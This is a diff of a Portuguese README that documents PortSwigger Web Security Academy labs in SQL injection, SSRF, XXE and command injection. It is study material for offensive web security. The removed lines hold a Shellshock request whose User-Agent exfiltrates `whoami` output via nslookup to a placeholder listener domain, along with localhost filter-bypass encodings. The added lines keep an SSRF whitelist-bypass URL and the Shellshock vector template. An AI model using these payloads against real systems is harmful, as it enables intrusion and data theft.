@@ -1,67 +1,53 @@
-
 ---
 
 # 🔒 Web Security Labs – PortSwigger Red Team Practice
+**Documentação completa de laboratórios práticos de segurança ofensiva web, com foco em exploração manual, análise de vulnerabilidades e desenvolvimento de raciocínio de ataque.**
 
-[![Progress](https://img.shields.io/badge/Progress-75%25-brightgreen?style=flat-square)](https://github.com/wkkwkwjwjjKk/Web-Security-Labs-PortSwigger-Red-Team-Practice)
-[![Labs](https://img.shields.io/badge/Labs-15%2F20-blue?style=flat-square)](https://github.com/wkkwkwjwjjKk/Web-Security-Labs-PortSwigger-Red-Team-Practice)
-[![Status](https://img.shields.io/badge/Status-Active-green?style=flat-square)](https://github.com/wkkwkwjwjjKk/Web-Security-Labs-PortSwigger-Red-Team-Practice)
-[![License](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)](./LICENSE)
-
-Documentação completa de **laboratórios práticos** de segurança ofensiva web, com foco em exploração manual, análise de vulnerabilidades e desenvolvimento de raciocínio de ataque.
-
-> **Nível**: Intermediário → Avançado | **Plataforma**: PortSwigger Web Security Academy | **Idioma**: Português (PT‑BR)
+| Detalhe | Informação |
+|---|---|
+| Nível | Intermediário → Avançado |
+| Plataforma | PortSwigger Web Security Academy |
+| Idioma | Português (PT‑BR) |
+| Total de laboratórios | 20 |
+| Concluídos | 15 |
+| Progresso geral | **75%** |
 
 ---
 
 ## 📊 Status Geral do Repositório
-
-```
-████████████░░░░░░░░░░ 75% Completo (15/20 laboratórios documentados)
-```
-
 | Status | Quantidade | Percentual |
-|--------|-----------|-----------|
-| ✅ **Concluído** | 14 | 70% |
-| 🟡 **Metodologia Dominada / Em Estudo** | 1 | 5% |
-| 🔴 **Não Iniciado** | 5 | 25% |
+|---|---|---|
+| ✅ Concluído | 15 | 75% |
+| 🟡 Em Estudo / Metodologia Dominada | 1 | 5% |
+| 🔴 Não Iniciado | 4 | 20% |
 
 ---
 
-## 🚀 Comece Rápido
+## 🚀 Roteiro de Estudo por Nível
+### 🟢 Iniciante
+- Autenticação e controle de acesso
+- SQL Injection básica
+- Conceitos fundamentais de requisições HTTP
+- **Tempo estimado**: ~4 horas
 
-### Por Nível de Conhecimento
+### 🟠 Intermediário
+- Injeções avançadas: SQLi cega, SSRF, Command Injection
+- Manipulação de cabeçalhos, parâmetros e URLs
+- Técnicas OAST para detecção e extração sem retorno visível
+- **Tempo estimado**: ~15 horas
 
-**🟢 Iniciante**
-```
-1. Autenticação e controle de acesso
-2. SQL Injection básica
-3. Conceitos fundamentais de requisições HTTP
-```
-**Tempo estimado**: ~4 horas
-
-**🟠 Intermediário**
-```
-1. Injeções avançadas: SQLi cega, SSRF, Command Injection
-2. Manipulação de cabeçalhos, parâmetros e URLs
-3. Técnicas OAST para detecção e extração sem retorno visível
-```
-**Tempo estimado**: ~15 horas
-
-**🔴 Avançado**
-```
-1. XXE, SSTI e Desserialização Insegura
-2. Análise e exploração de falhas em lógica de negócio
-3. Testes e segurança em APIs
-```
-**Tempo estimado**: ~20 horas
+### 🔴 Avançado
+- XXE, SSTI e Desserialização Insegura
+- Análise e exploração de falhas em lógica de negócio
+- Testes e segurança em APIs
+- **Tempo estimado**: ~20 horas
 
 ---
 
 ## 🎓 Categorias e Laboratórios
 
 ### 🟢 Autenticação e Controle de Acesso
-✅ **Status**: 100% concluído
+**✅ Status: 100% concluído**
 - Enumeração de usuários e contas
 - Bypass de limites de tentativas e bloqueios
 - Contornos em fluxos de autenticação de dois fatores (2FA)
@@ -71,9 +57,8 @@ Documentação completa de **laboratórios práticos** de segurança ofensiva we
 ---
 
 ### 🟡 Injeção de Código e Comandos
-
 #### 📌 SQL Injection
-✅ **Status**: 9/9 laboratórios concluídos
+**✅ Status: 9/9 laboratórios concluídos**
 - Injeção simples com uso de `UNION` para extração de dados
 - Enumeração de esquemas, tabelas e colunas do banco
 - SQLi cega por condição booleana e por atraso no tempo de resposta
@@ -81,140 +66,81 @@ Documentação completa de **laboratórios práticos** de segurança ofensiva we
 - Injeção em formatos não convencionais: XML e JSON
 
 #### 📌 SSRF – Server‑Side Request Forgery
-🟡 **Status**: 7/7 laboratórios trabalhados — conceitos e metodologia 100% dominados
+**🟡 Status: 7/7 laboratórios trabalhados – metodologia 100% dominada**
+> **Conceito**: Vulnerabilidade que permite ao atacante manipular requisições feitas pela própria aplicação, transformando o servidor em um "proxy" para acessar recursos internos ou restritos da rede.
 
-**Conceito**: Vulnerabilidade que permite ao atacante manipular requisições feitas pela própria aplicação, fazendo com que o servidor envie solicitações arbitrárias para destinos internos ou externos. Isso possibilita acessar recursos, serviços e sistemas que não seriam diretamente visíveis ou acessíveis a partir da internet pública.
+| Laboratório | Técnicas Aplicadas | Resultado |
+|---|---|---|
+| Basic SSRF against the local server | Manipulação de parâmetro para `http://127.0.0.1/admin` | Acesso a interfaces administrativas locais |
+| Basic SSRF against another back‑end system | Alteração para IPs da faixa `192.168.0.0/24` | Acesso a servidores internos sem exposição pública |
+| SSRF with blacklist‑based filter | Representações alternativas de IP, domínios resolvidos para localhost | Bypass total de bloqueios |
+| SSRF with filter via open redirection | Combinação com falha de redirecionamento aberto | Validação aceita, requisição direcionada ao alvo |
+| Blind SSRF com detecção OAST | Cabeçalho `Referer` + Interactsh | Confirmação da falha sem retorno visível |
+| SSRF com filtro de lista branca | Uso de `@`, `#` e codificação dupla: `http://stock.weliketoshop.net%2523@127.0.0.1/admin` | Validação aprovada e requisição executada para o servidor local |
+| Blind SSRF com Shellshock | Cabeçalho `Referer` para `192.168.0.141:8080` + vetor `() { :; }; COMANDO` | Fluxo de ataque dominado; limitação apenas por restrição da plataforma |
 
-**Laboratórios trabalhados**:
-1. **Basic SSRF against the local server** ✅
-   - Manipulação do parâmetro ou URL alvo
-   - Redirecionamento da requisição para `http://localhost` ou `127.0.0.1`
-   - **Objetivo**: Acessar interfaces administrativas e serviços restritos que só aceitam conexões vindas do próprio servidor
+> **Principais aprendizados**: Listas brancas não são mais seguras que listas negras; é possível encadear vulnerabilidades; cabeçalhos aparentemente inofensivos são vetores válidos; técnicas OAST são essenciais para explorações cegas.
 
-2. **Basic SSRF against another back‑end system** ✅
-   - Alteração do destino para endereços da rede interna, na faixa `192.168.0.0/24`
-   - **Resultado**: Comunicação com máquinas de apoio e servidores internos sem acesso público
-   - **Aprendizado**: O SSRF funciona como uma "ponte" entre a internet e a infraestrutura interna da aplicação
+#### 📌 XML External Entity (XXE) Injection
+**✅ Status: 6/7 laboratórios concluídos**
+> **Conceito**: Falha no processamento de arquivos XML que permite a declaração de entidades externas, possibilitando leitura de arquivos locais, requisições arbitrárias e até execução de código em alguns cenários.
 
-3. **SSRF with blacklist‑based input filter** ✅
-   - **Desafio**: A aplicação bloqueava termos como `localhost`, `127.0.0.1` e intervalos de IP privados
-   - **Técnicas de contorno**:
-     - Representações alternativas de IP: `2130706433`, `0177.0.0.1`, `0x7f.0.0.1`
-     - Uso de domínios que resolvem para o endereço local
-     - Inserção de caracteres extras e codificação parcial
-   - **Resultado**: Acesso bem‑sucedido mesmo com filtro de bloqueio ativo
+| Laboratório | Nível | Status | Técnica Principal |
+|---|---|---|---|
+| Exploiting XXE to retrieve files | Aprendiz | ✅ Resolvido | Declaração de entidade externa apontando para caminhos do sistema |
+| Exploiting XXE to perform SSRF | Aprendiz | ✅ Resolvido | Uso de entidades para fazer requisições do servidor a alvos internos |
+| Blind XXE com interação fora de banda | Praticante | ✅ Resolvido | Detecção via consultas DNS/HTTP para servidor controlado |
+| Blind XXE com entidades de parâmetro | Praticante | 🔴 Não resolvido | Aprofundamento em entidades de parâmetro e DTDs externas |
+| Blind XXE com extração via DTD maliciosa | Praticante | ✅ Resolvido | Hospedagem de DTD externa para enviar dados para fora |
+| Blind XXE com extração via mensagens de erro | Praticante | ✅ Resolvido | Forçar retorno de erros contendo o conteúdo alvo |
+| Exploiting XInclude para leitura de arquivos | Praticante | ✅ Resolvido | Uso da instrução `XInclude` sem alterar a estrutura raiz do XML |
 
-4. **SSRF with filter bypass via open redirection** ✅
-   - **Desafio**: A aplicação só permitia requisições para o próprio domínio
-   - **Estratégia**: Combinação com falha de redirecionamento aberto existente
-   - **Payload exemplo**: `/redirect?url=http://127.0.0.1/admin`
-   - **Resultado**: O validador aceitou o caminho interno, enquanto o redirecionamento levou a requisição ao destino desejado
-
-5. **Blind SSRF with out‑of‑band detection** ✅ *Resolvido*
-   - **Cenário**: Não havia retorno do conteúdo ou mensagens visíveis na resposta
-   - **Técnica**: Detecção via canal fora de banda (OAST)
-   - **Vetor**: Cabeçalho HTTP `Referer`
-   - **Ferramenta**: Interactsh — alternativa gratuita ao Burp Collaborator
-   - **Resultado**: Confirmação da vulnerabilidade por meio de consultas DNS e requisições HTTP registradas no servidor de escuta
-
-6. **SSRF with whitelist‑based input filter** ✅ *Resolvido*
-   - **Desafio**: A aplicação só aceitava URLs contendo o domínio `stock.weliketoshop.net`
-   - **Problema explorado**: Diferença de interpretação entre o sistema de validação e o cliente HTTP que executa a requisição
-   - **Técnicas aplicadas**:
-     - Uso do caractere `@`: tudo antes é ignorado como credencial fictícia
-     - Uso do caractere `#`: define um fragmento que não é enviado na requisição final
-     - Codificação dupla para enganar rotinas de filtro
-   - **Payload final**: `http://stock.weliketoshop.net%2523@127.0.0.1/admin`
-   - **Resultado**: Validação aprovada e requisição executada para o servidor local
-
-7. **Blind SSRF with Shellshock exploitation** 🟡 *Metodologia e fluxo de ataque compreendidos*
-   - **Objetivo**: Usar o SSRF para acessar um servidor interno vulnerável e transformar o acesso em execução remota de comandos, extraindo dados do sistema
-   - **Fluxo compreendido**:
-     1. **Vetor SSRF**: Cabeçalho `Referer` para apontar para o alvo interno `192.168.0.141:8080`
-     2. **Vetor Shellshock**: Servidores com versões antigas do Bash interpretam cabeçalhos como variáveis de ambiente. Formato da injeção:
-        ```
-        () { :; }; COMANDO_A_SER_EXECUTADO
-        ```
-     3. **Detecção**: Uso de técnica OAST para enviar o resultado do comando `whoami` para um servidor externo controlado
-   - **Requisição pronta**:
-     ```http
-     GET /product?productId=4 HTTP/2
-     Host: 0af30028034805ef825e2e92001900e9.web-security-academy.net
-     Cookie: session=pM7PPdH5yPalXS9lk12BFVpDpLq1fDpo
-     Referer: http://192.168.0.141:8080
-     User-Agent: () { :; }; /usr/bin/nslookup $(whoami).seu-servidor-de-escuta.com
-     ```
-   - **Limitações encontradas**: A plataforma PortSwigger bloqueia comunicação com servidores genéricos, permitindo apenas o Burp Collaborator. Ferramentas gratuitas como o Interactsh foram bloqueadas, impedindo a visualização da interação
-   - **Conclusão**: Todo o fluxo e lógica de ataque estão dominados. Em ambientes sem restrições ou com as ferramentas adequadas, a exploração é totalmente funcional
-
-**✅ Aprendizados da categoria**:
-- Listas de permissão não são mais seguras que listas de bloqueio — dependem de interpretação consistente em todas as etapas
-- É possível **encadear vulnerabilidades**: de um SSRF simples até a execução remota de comandos
-- Cabeçalhos e parâmetros aparentemente inofensivos podem ser usados como vetores de ataque
-- Técnicas OAST são fundamentais para confirmar falhas quando não há retorno visível
-- Restrições de rede podem limitar a execução, mas não invalidam a lógica do ataque
-
----
+> **Principais aprendizados**: O processamento de XML pode ser explorado de formas não óbvias; falhas cegas não impedem extração de dados; entidades de parâmetro e DTDs externas ampliam as possibilidades de ataque.
 
 #### 📌 Command Injection
-✅ **Status**: 100% concluído
+**✅ Status: 100% concluído**
+> **Conceito**: Ocorre quando entrada do usuário é enviada diretamente ao interpretador de comandos do SO sem sanitização, permitindo execução arbitrária.
 
-**Conceito**: Ocorre quando a aplicação repassa entrada do usuário diretamente ao interpretador de comandos do sistema operacional, sem sanitização ou validação adequada, permitindo execução arbitrária de instruções.
-
-**Laboratórios resolvidos**:
-1. **Basic Command Injection**
-   - Inserção de separadores como `;`, `&`, `|`, `&&` para encadear comandos
-   - Confirmação imediata através da saída retornada na resposta
-
-2. **Blind OS Command Injection with Time Delays**
-   - Detecção por alteração no tempo de resposta usando o comando `sleep`
-
-3. **Blind OS Command Injection with Out‑of‑Band Exfiltration**
-   - Cenário sem retorno visível
-   - **Técnica**: O comando injetado força o servidor a fazer uma requisição para um domínio controlado
-   - **Resultado**: A interação recebida confirma a execução mesmo sem evidências na tela
-
-**Principais aprendizados**:
-- Falta de retorno visível não significa ausência de vulnerabilidade
-- Técnicas OAST permitem confirmar e extrair dados de forma silenciosa
-- Entradas que parecem inofensivas podem comprometer todo o sistema operacional
+- Básico: uso de separadores como `;`, `&`, `|` para encadear comandos
+- Cego por atraso: detecção através do comando `sleep`
+- Cego com extração fora de banda: requisição para domínio controlado confirmando a execução
+> **Aprendizado**: Ausência de retorno visível não significa ausência de vulnerabilidade.
 
 ---
 
 ### 🟢 Manipulação de Requisições e Fluxos
-✅ **Status**: 100% concluído
+**✅ Status: 100% concluído**
 - CSRF básico e com contorno de validações
-- Poluição de parâmetros e atribuição em massa (*mass assignment*)
+- Poluição de parâmetros e atribuição em massa
 - Vulnerabilidades em tokens JWT e mecanismos de sessão
 
 ---
 
 ### 🔴 Tópicos a Iniciar
-- **XXE Injection**: Exploração de processamento inseguro de arquivos XML
-- **SSTI**: Injeção em mecanismos de renderização de templates
-- **Desserialização Insegura**: Manipulação de objetos serializados
-- Falhas em lógica de negócio e regras de funcionamento da aplicação
-- Vulnerabilidades específicas em APIs REST e GraphQL
+- SSTI: Injeção em mecanismos de renderização de templates
+- Desserialização Insegura: Manipulação de objetos serializados
+- Falhas em lógica de negócio
+- Vulnerabilidades em APIs REST e GraphQL
 
 ---
 
 ## 🛠️ Ferramentas Utilizadas
-- **Burp Suite Community Edition**: Proxy, interceptação, análise e envio de requisições
-- **Interactsh**: Serviço OAST gratuito para detecção e extração de dados em ataques cegos
-- **Ferramentas do navegador**: Depurador, inspetor de elementos e análise de rede
-- **Utilitários de linha de comando**: `curl`, `nslookup`, `ping`
+- **Burp Suite Community Edition**: Interceptação, análise e modificação de requisições
+- **Interactsh**: Serviço OAST gratuito para detecção e extração em ataques cegos
+- **Ferramentas do navegador**: Depurador, análise de rede e inspeção de requisições
+- **Utilitários de linha**: `curl`, `nslookup`, `ping`
 
 ---
 
 ## 📚 Referências
-- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
-- [OWASP Top 10](https://owasp.org/Top10/)
-- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
-- [HackTricks](https://book.hacktricks.xyz/)
+- PortSwigger Web Security Academy
+- OWASP Top 10
+- OWASP Cheat Sheet Series
+- HackTricks
 
 ---
 
-## ⚠️ Aviso Legal
-Todos os testes e análises foram realizados **exclusivamente em ambientes autorizados e controlados**, para fins de estudo e pesquisa em segurança da informação. Não utilize as técnicas descritas em sistemas ou aplicações que você não possua permissão explícita para testar.
+⚠️ **Aviso Legal**
+Todos os testes e análises foram realizados exclusivamente em ambientes autorizados e controlados, para fins de estudo e pesquisa em segurança da informação. Não aplique as técnicas descritas em sistemas ou aplicações sem permissão explícita do responsável.
 
 ---
